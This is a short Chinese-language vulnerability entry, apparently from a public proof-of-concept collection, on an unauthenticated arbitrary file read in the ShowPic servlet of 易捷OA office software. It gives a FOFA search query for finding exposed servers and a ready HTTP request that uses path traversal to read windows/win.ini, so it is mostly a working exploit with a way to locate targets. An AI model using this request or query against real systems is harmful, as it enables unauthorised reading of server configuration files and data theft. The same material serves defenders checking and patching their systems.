# 易捷OA协同办公软件ShowPic接口存在任意文件读取

易捷OA协同办公软件 ShowPic 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。

## fofa

```java
body="/images/logon/bg_img.jpg"
```

## poc

```js
GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![效果图](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408062347366.png)